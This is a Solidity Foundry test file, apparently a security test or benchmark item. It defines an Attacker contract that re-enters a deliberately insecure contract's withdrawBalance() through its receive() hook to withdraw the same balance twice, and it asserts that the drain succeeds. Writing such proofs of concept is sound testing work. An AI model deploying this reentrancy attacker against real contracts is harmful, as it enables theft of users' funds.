
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    using stdStorage for StdStorage;

    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set the attacker's balance in the victim contract's userBalances mapping
        // userBalances is at slot 0, and we need to set userBalances[attacker] = attackVal
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(0)));
        vm.store(address(_contractUnderTest), slot, bytes32(attackVal));

        // --- 3. Funding ---
        // Fund the Victim contract with enough ETH to be drained (2x attackVal for reentrancy)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's balance before attack
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        victim.withdrawBalance();

        // 4. Verify Success Conditions
        // If reentrancy succeeded, we should have received ETH twice (2 * val)
        // because the balance wasn't zeroed before the second call
        uint256 finalBalance = address(this).balance;
        uint256 gained = finalBalance - initialSnapshot;
        
        // Exploit succeeded if we received more than the single withdrawal amount
        // This means the reentrancy allowed us to withdraw twice
        if (gained >= storedAttackVal * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            // Re-enter the contract - since userBalances wasn't zeroed yet, we can withdraw again
            attackCallCount++;
            victim.withdrawBalance();
        }
    }
}
